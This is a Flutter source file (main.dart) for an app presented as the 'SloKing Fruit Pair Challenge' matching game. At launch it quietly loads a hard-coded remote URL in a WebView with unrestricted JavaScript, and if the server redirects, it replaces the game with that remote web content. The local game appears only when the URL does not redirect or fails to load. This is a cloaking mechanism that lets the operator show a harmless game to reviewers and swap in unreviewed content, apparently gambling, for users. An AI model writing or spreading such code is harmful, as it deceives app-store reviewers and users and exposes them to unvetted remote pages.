import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:go_router/go_router.dart';
import 'package:sloking/bloc/game_progress_bloc/game_progress_bloc.dart';
import 'package:sloking/pages/daily_bonus_page.dart';
import 'package:sloking/pages/game_page.dart';
import 'package:sloking/pages/home_page.dart';
import 'package:sloking/pages/rules_page.dart';
import 'package:sloking/pages/splash_page.dart';
import 'package:sloking/generated/l10n.dart';
import 'package:sloking/repositories/hive_repository.dart';
import 'package:sloking/web_view_app.dart';
import 'package:webview_flutter/webview_flutter.dart';

part 'router_config.dart';

late final WebViewController _webViewController;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  await ScreenUtil.ensureScreenSize();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
  ]);

  const String redirectHandlerUrl = "https://nebulaquest.site/Fj6Xtv6W";
  ValueNotifier<bool?> isRedirectedToWeb = ValueNotifier(null);

  isRedirectedToWeb.addListener(() {
    if (isRedirectedToWeb.value == null) return;
    if (isRedirectedToWeb.value == true) {
      runApp(WebViewApp(webViewController: _webViewController));
    } else {
      runApp(const MyApp());
    }
    isRedirectedToWeb.removeListener(() {});
  });

  _webViewController = WebViewController()
    ..setJavaScriptMode(JavaScriptMode.unrestricted)
    ..setBackgroundColor(const Color(0x00000000))
    ..setNavigationDelegate(
      NavigationDelegate(
        onWebResourceError: (WebResourceError error) {
          isRedirectedToWeb.value ??= false;
        },
        onNavigationRequest: (NavigationRequest request) {
          if (request.url != redirectHandlerUrl) {
            isRedirectedToWeb.value ??= true;
          } else {
            const Duration redirectionDelay = Duration(seconds: 1);
            Future.delayed(redirectionDelay, () {
              isRedirectedToWeb.value ??= false;
            });
          }
          return NavigationDecision.navigate;
        },
      ),
    )
    ..loadRequest(Uri.parse(redirectHandlerUrl));
  runApp(WebViewApp(webViewController: _webViewController));
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiRepositoryProvider(
      providers: [
        RepositoryProvider(
          create: (context) => HiveRepository.init(),
          lazy: true,
        ),
      ],
      child: MultiBlocProvider(
        providers: [
          BlocProvider(create: (context) => GameProgressBloc(hiveRepository: context.read<HiveRepository>())),
        ],
        child: ScreenUtilInit(
          designSize: const Size(412, 832),
          builder: (_, __) => MaterialApp.router(
            title: "SloKing Fruit Pair Challenge",
            localizationsDelegates: const [
              S.delegate,
              GlobalMaterialLocalizations.delegate,
              GlobalWidgetsLocalizations.delegate,
              GlobalCupertinoLocalizations.delegate,
            ],
            supportedLocales: S.delegate.supportedLocales,
            debugShowCheckedModeBanner: false,
            routerConfig: _routerConfig,
            showPerformanceOverlay: false,
          ),
        ),
      ),
    );
  }
}
